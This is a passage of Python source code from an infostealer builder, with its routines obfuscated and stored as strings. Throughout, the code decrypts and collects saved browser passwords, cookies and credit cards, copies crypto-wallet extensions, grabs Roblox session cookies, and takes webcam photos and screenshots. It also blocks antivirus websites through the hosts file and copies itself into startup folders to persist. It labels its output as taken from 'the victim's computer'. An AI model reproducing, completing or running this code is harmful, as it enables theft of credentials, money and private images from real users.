            v4r_decryptor = v4r_cipher.decryptor()
            v4r_decrypted_pass = v4r_decryptor.update(v4r_payload) + v4r_decryptor.finalize()
            return v4r_decrypted_pass.decode()
        except:
            return None
        
    def D3f_GetPasswords(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_passwords
        v4r_password_db = os.path.join(v4r_profile_path, 'Login Data')
        if not os.path.exists(v4r_password_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_password_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =          f"- Url      : {v4r_row[0]}"
            v4r_username =     f"  Username : {v4r_row[1]}"
            v4r_password =     f"  Password : {D3f_Decrypt(v4r_row[2], v4r_master_key)}"
            v4r_browser_name = f"  Browser  : {v4r_browser}"
            v4r_file_passwords.append(f"{v4r_url}\n{v4r_username}\n{v4r_password}\n{v4r_browser_name}\n")
            v4r_number_passwords += 1

        v4r_conn.close()

    def D3f_GetCookies(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_cookies
        v4r_cookie_db = os.path.join(v4r_profile_path, 'Network', 'Cookies')
        if not os.path.exists(v4r_cookie_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_cookie_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_url =          f"- Url     : {v4r_row[0]}"
            v4r_name =         f"  Name    : {v4r_row[1]}"
            v4r_path =         f"  Path    : {v4r_row[2]}"
            v4r_cookie =       f"  Cookie  : {D3f_Decrypt(v4r_row[3], v4r_master_key)}"
            v4r_expire =       f"  Expire  : {v4r_row[4]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_cookies.append(f"{v4r_url}\n{v4r_name}\n{v4r_path}\n{v4r_cookie}\n{v4r_expire}\n{v4r_browser_name}\n")
            v4r_number_cookies += 1

        v4r_conn.close()

    def D3f_GetHistory(v4r_browser, v4r_profile_path):
        global v4r_number_history
        v4r_history_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_history_db):
            return
        
        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_history_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =          f"- Url     : {v4r_row[0]}"
            v4r_title =        f"  Title   : {v4r_row[1]}"
            v4r_time =         f"  Time    : {v4r_row[2]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_history.append(f"{v4r_url}\n{v4r_title}\n{v4r_time}\n{v4r_browser_name}\n")
            v4r_number_history += 1

        v4r_conn.close()
    
    def D3f_GetDownloads(v4r_browser, v4r_profile_path):
        global v4r_number_downloads
        v4r_downloads_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_downloads_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_downloads_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in v4r_cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            v4r_path =         f"- Path    : {row[1]}"
            v4r_url =          f"  Url     : {row[0]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_downloads.append(f"{v4r_path}\n{v4r_url}\n{v4r_browser_name}\n")
            v4r_number_downloads += 1

        v4r_conn.close()
    
    def D3f_GetCards(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_cards
        v4r_cards_db = os.path.join(v4r_profile_path, 'Web Data')
        if not os.path.exists(v4r_cards_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_cards_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_name =             f"- Name             : {v4r_row[0]}"
            v4r_expiration_month = f"  Expiration Month : {v4r_row[1]}"
            v4r_expiration_year =  f"  Expiration Year  : {v4r_row[2]}"
            v4r_card_number =      f"  Card Number      : {D3f_Decrypt(v4r_row[3], v4r_master_key)}"
            v4r_date_modified =    f"  Date Modified    : {v4r_row[4]}"
            v4r_browser_name =     f"  Browser          : {v4r_browser}"
            v4r_file_cards.append(f"{v4r_name}\n{v4r_expiration_month}\n{v4r_expiration_year}\n{v4r_card_number}\n{v4r_date_modified}\n{v4r_browser_name}\n")
            v4r_number_cards += 1
        
        v4r_conn.close()

    def D3f_GetExtentions(v4r_zip_file, v4r_extensions_names, v4r_browser, v4r_profile_path):
        global v4r_number_extentions
        v4r_extensions_path = os.path.join(v4r_profile_path, 'Extensions')
        v4r_zip_folder = os.path.join("Extensions", v4r_browser)

        if not os.path.exists(v4r_extensions_path):
            return 

        v4r_extentions = [v4r_item for v4r_item in os.listdir(v4r_extensions_path) if os.path.isdir(os.path.join(v4r_extensions_path, v4r_item))]
        
        for v4r_extention in v4r_extentions:
            if "Temp" in v4r_extention:
                continue
            
            v4r_number_extentions += 1
            v4r_extension_found = False
            
            for v4r_extension_name, v4r_extension_folder in v4r_extensions_names:
                if v4r_extention == v4r_extension_folder:
                    v4r_extension_found = True
                    
                    v4r_extension_folder_path = os.path.join(v4r_zip_folder, v4r_extension_name, v4r_extention)
                    
                    v4r_source_extension_path = os.path.join(v4r_extensions_path, v4r_extention)
                    for v4r_item in os.listdir(v4r_source_extension_path):
                        v4r_item_path = os.path.join(v4r_source_extension_path, v4r_item)
                        
                        if os.path.isdir(v4r_item_path):
                            for dirpath, dirnames, filenames in os.walk(v4r_item_path):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, v4r_source_extension_path)
                                    v4r_zip_file.write(file_path, os.path.join(v4r_extension_folder_path, arcname))
                        else:
                            v4r_zip_file.write(v4r_item_path, os.path.join(v4r_extension_folder_path, v4r_item))
                    break

            if not v4r_extension_found:
                v4r_other_folder_path = os.path.join(v4r_zip_folder, "Unknown Extension", v4r_extention)
                
                v4r_source_extension_path = os.path.join(v4r_extensions_path, v4r_extention)
                for v4r_item in os.listdir(v4r_source_extension_path):
                    v4r_item_path = os.path.join(v4r_source_extension_path, v4r_item)
                    
                    if os.path.isdir(v4r_item_path):
                        for dirpath, dirnames, filenames in os.walk(v4r_item_path):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, v4r_source_extension_path)
                                v4r_zip_file.write(file_path, os.path.join(v4r_other_folder_path, arcname))
                    else:
                        v4r_zip_file.write(v4r_item_path, os.path.join(v4r_other_folder_path, v4r_item))

    v4r_browser_files = [
        ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(v4r_path_appdata_local,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(v4r_path_appdata_local,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(v4r_path_appdata_local,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(v4r_path_appdata_local,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(v4r_path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(v4r_path_appdata_local,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(v4r_path_appdata_local,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(v4r_path_appdata_local,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(v4r_path_appdata_local,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(v4r_path_appdata_local,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(v4r_path_appdata_local,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(v4r_path_appdata_local,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(v4r_path_appdata_local,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(v4r_path_appdata_local,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(v4r_path_appdata_local,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(v4r_path_appdata_local,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(v4r_path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(v4r_path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    v4r_profiles = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    v4r_extensions_names = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for v4r_name, v4r_path, v4r_proc_name in v4r_browser_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for v4r_name, v4r_path, v4r_proc_name in v4r_browser_files:
        if not os.path.exists(v4r_path):
            continue

        v4r_master_key = D3f_GetMasterKey(os.path.join(v4r_path, 'Local State'))
        if not v4r_master_key:
            continue

        for v4r_profile in v4r_profiles:
            v4r_profile_path = os.path.join(v4r_path, v4r_profile)
            if not os.path.exists(v4r_profile_path):
                continue

        for v4r_profile in v4r_profiles:
            v4r_profile_path = os.path.join(v4r_path, v4r_profile)
            if not os.path.exists(v4r_profile_path):
                continue
            
            if "extentions" in v4r_browser_choice:
                try: D3f_GetExtentions(v4r_zip_file, v4r_extensions_names, v4r_name, v4r_profile_path)
                except: pass
                
            if "passwords" in v4r_browser_choice:
                try: D3f_GetPasswords(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass
            if "cookies" in v4r_browser_choice:
                try: D3f_GetCookies(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass
            if "history" in v4r_browser_choice:
                try: D3f_GetHistory(v4r_name, v4r_profile_path)
                except: pass
            if "downloads" in v4r_browser_choice:
                try: D3f_GetDownloads(v4r_name, v4r_profile_path)
                except: pass
            if "cards" in v4r_browser_choice:
                try: D3f_GetCards(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass

            if v4r_name not in v4r_browsers:
                v4r_browsers.append(v4r_name)

    if "passwords" in v4r_browser_choice:
        if not v4r_file_passwords:
            v4r_file_passwords.append("No passwords was saved on the victim's computer.")
        v4r_file_passwords = "\n".join(v4r_file_passwords)
    if "cookies" in v4r_browser_choice:
        if not v4r_file_cookies:
            v4r_file_cookies.append("No cookies was saved on the victim's computer.")
        v4r_file_cookies   = "\n".join(v4r_file_cookies)
    if "history" in v4r_browser_choice:
        if not v4r_file_history:
            v4r_file_history.append("No history was saved on the victim's computer.")
        v4r_file_history   = "\n".join(v4r_file_history)
    if "downloads" in v4r_browser_choice:
        if not v4r_file_downloads:
            v4r_file_downloads.append("No downloads was saved on the victim's computer.")
        v4r_file_downloads = "\n".join(v4r_file_downloads)
    if "cards" in v4r_browser_choice:
        if not v4r_file_cards:
            v4r_file_cards.append("No cards was saved on the victim's computer.")
        v4r_file_cards     = "\n".join(v4r_file_cards)
    
    if v4r_number_passwords != None:
        v4r_zip_file.writestr(f"Passwords ({v4r_number_passwords}).txt", v4r_file_passwords)

    if v4r_number_cookies != None:
        v4r_zip_file.writestr(f"Cookies ({v4r_number_cookies}).txt", v4r_file_cookies)

    if v4r_number_cards != None:
        v4r_zip_file.writestr(f"Cards ({v4r_number_cards}).txt", v4r_file_cards)

    if v4r_number_history != None:
        v4r_zip_file.writestr(f"Browsing History ({v4r_number_history}).txt", v4r_file_history)

    if v4r_number_downloads != None:
        v4r_zip_file.writestr(f"Download History ({v4r_number_downloads}).txt",v4r_file_downloads)

    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

R0b10xAccount = r'''
def D3f_R0b10xAccount(v4r_zip_file):
    import browser_cookie3
    import requests
    import json

    v4r_file_roblox_account = ""
    v4r_number_roblox_account = 0
    v4r_c00ki35_list = []
    

    def D3f_G3tC00ki34ndN4vig4t0r(v4r_br0ws3r_functi0n):
        try:
            v4r_c00kie5 = v4r_br0ws3r_functi0n()
            v4r_c00kie5 = str(v4r_c00kie5)
            v4r_c00kie = v4r_c00kie5.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            v4r_n4vigator = v4r_br0ws3r_functi0n.__name__
            return v4r_c00kie, v4r_n4vigator
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    v4r_br0ws3r5 = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in v4r_br0ws3r5:
        v4r_c00ki3, v4r_n4vigator = D3f_G3tC00ki34ndN4vig4t0r(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in v4r_c00ki35_list:
                v4r_number_roblox_account += 1
                v4r_c00ki35_list.append(v4r_c00ki3)
                try:
                    v4r_inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    v4r_api = json.loads(v4r_inf0.text)
                except:
                    v4r_api = {"None": "None"}

                v4r_us3r_1d_r0b10x = v4r_api.get('id', "None")
                v4r_d1spl4y_nam3_r0b10x = v4r_api.get('displayName', "None")
                v4r_us3rn4m3_r0b10x = v4r_api.get('name', "None")
                v4r_r0bux_r0b10x = v4r_api.get("RobuxBalance", "None")
                v4r_pr3mium_r0b10x = v4r_api.get("IsPremium", "None")
                v4r_av4t4r_r0b10x = v4r_api.get("ThumbnailUrl", "None")
                v4r_bui1d3r5_c1ub_r0b10x = v4r_api.get("IsAnyBuildersClubMember", "None")
                
                v4r_file_roblox_account = v4r_file_roblox_account + f"""
Roblox Account n°{str(v4r_number_roblox_account)}:
 - Navigator     : {v4r_n4vigator}
 - Username      : {v4r_us3rn4m3_r0b10x}
 - DisplayName   : {v4r_d1spl4y_nam3_r0b10x}
 - Id            : {v4r_us3r_1d_r0b10x}
 - Avatar        : {v4r_av4t4r_r0b10x}
 - Robux         : {v4r_r0bux_r0b10x}
 - Premium       : {v4r_pr3mium_r0b10x}
 - Builders Club : {v4r_bui1d3r5_c1ub_r0b10x}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not v4r_c00ki35_list:
        v4r_file_roblox_account = "No roblox cookie found."
        
    v4r_zip_file.writestr(f"Roblox Accounts ({v4r_number_roblox_account}).txt", v4r_file_roblox_account)

    return v4r_number_roblox_account
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

W3bc4m = r'''
def D3f_W3bc4m(v4r_zip_file):
    import cv2
    import io
    from PIL import Image

    try:
        v4r_status_camera_capture = "Yes"
        v4r_cap = cv2.VideoCapture(0)

        if not v4r_cap.isOpened():
            v4r_status_camera_capture = "No webcam found."
            return v4r_status_camera_capture

        v4r_ret, v4r_frame = v4r_cap.read()
        v4r_cap.release()

        if not v4r_ret:
            v4r_status_camera_capture = "Failed to capture image."
            D3f_Clear()
            return v4r_status_camera_capture

        v4r_frame_rgb = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        v4r_img_pil = Image.fromarray(v4r_frame_rgb)
        v4r_img_bytes = io.BytesIO()
        v4r_img_pil.save(v4r_img_bytes, format='PNG')
        v4r_img_bytes.seek(0)
        v4r_zip_file.writestr("Webcam.png", v4r_img_bytes.read())

        return v4r_status_camera_capture

    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"
        return v4r_status_camera_capture
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Scr33n5h0t = r'''
def D3f_Scr33n5h0t(zip_file):
    import io
    from PIL import ImageGrab

    try:
        v4r_number_screenshot = "Yes"

        def C4ptur3():
            v4r_image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            v4r_image_bytes = io.BytesIO()
            v4r_image.save(v4r_image_bytes, format='PNG')
            v4r_image_bytes.seek(0)
            return v4r_image_bytes

        v4r_image_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", v4r_image_bytes.read())
        return v4r_number_screenshot
    except Exception as e:
        v4r_number_screenshot = f"Error: {e}"
        return v4r_number_screenshot
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckW3b5it3 = r'''
def D3f_B10ckW3b5it3():
    import os

    "Perm Admin Required"
    try:
        def D3f_B10ck(v4r_w3bsite):
            v4r_hosts_path = os.path.join(os.environ["WINDIR"], "System32", "drivers", "etc", "hosts")
            if not os.path.exists(v4r_hosts_path):
                v4r_hosts_path = os.path.join("C:", "Windows", "System32", "drivers", "etc", "hosts")

            v4r_redirect = "127.0.0.1"
            with open(v4r_hosts_path, "a") as v4r_file:
                v4r_file.write("\n" + v4r_redirect + " " + v4r_w3bsite)
        
        v4r_w3b51t35_t0_8l0ck = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for v4r_w3b51t3_t0_8l0ck in v4r_w3b51t35_t0_8l0ck:
            D3f_B10ck(v4r_w3b51t3_t0_8l0ck)
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

St4rtup = r'''
def St4rtup():
    import os
    import sys
    import shutil

    try:
        v4r_file_path = os.path.abspath(sys.argv[0])

        if v4r_file_path.endswith(".exe"):
            v4r_ext = "exe"
        elif v4r_file_path.endswith(".py"):
            v4r_ext = "py"

        v4r_new_name = f"ㅤ.{v4r_ext}"

        if sys.platform.startswith('win'):  
            v4r_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            v4r_folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            v4r_folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        v4r_path_new_file = os.path.join(v4r_folder, v4r_new_name)

        shutil.copy(v4r_file_path, v4r_path_new_file)
        os.chmod(v4r_path_new_file, 0o777) 
    except:
        pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

St4rt = r'''
try: D3f_M3ss4g3P0pup()
except: pass

v4r_option = []

v4r_zip_buffer = io.BytesIO()
with zipfile.ZipFile(v4r_zip_buffer, "w", zipfile.ZIP_DEFLATED) as v4r_zip_file:

    try: 
        v4r_number_discord_injection = D3f_Di5c0rdInj3c710n()
    except Exception as e:
        v4r_number_discord_injection = f"Error: {e}"

    try: 
        v4r_status_system_info = D3f_Sy5t3mInf0(v4r_zip_file)
    except Exception as e:
        v4r_status_system_info = f"Error: {e}"

    try: 
        v4r_number_discord_account = D3f_Di5c0rdAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_discord_account = f"Error: {e}"

    try: 
        v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards = D3f_Br0w53r5t341(v4r_zip_file)
    except Exception as e:
        v4r_number_extentions = f"Error: {e}"
        v4r_number_passwords = f"Error: {e}"
        v4r_number_cookies = f"Error: {e}"
        v4r_number_history = f"Error: {e}"
        v4r_number_downloads = f"Error: {e}"
        v4r_number_cards = f"Error: {e}"

    try: 
        v4r_number_roblox_account = D3f_R0b10xAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_roblox_account = f"Error: {e}"

    try: 
        v4r_status_camera_capture = D3f_W3bc4m(v4r_zip_file)
    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"

    try: 
        v4r_status_screenshot = D3f_Scr33n5h0t(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
